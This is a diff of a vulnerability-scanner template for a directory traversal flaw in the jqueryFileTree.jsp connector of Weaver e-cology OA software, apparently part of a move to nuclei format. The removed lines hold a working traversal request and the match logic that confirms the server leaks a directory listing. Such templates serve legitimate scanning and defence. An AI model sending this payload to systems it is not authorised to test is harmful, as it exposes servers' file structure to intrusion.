@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: e-cology-jqueryfiletree-ile-inclusion
 
 info:
@@ -9,11 +10,3 @@ info:
     app="泛微-协同办公OA"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20jqueryFileTree.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
-    expression: response.status == 200 && response.body.bcontains(b'index.jsp') && response.body.bcontains(b'PortalCenter.jsp') && response.body.bcontains(b'PortalSettingOperation.jsp')
-expression: r0()
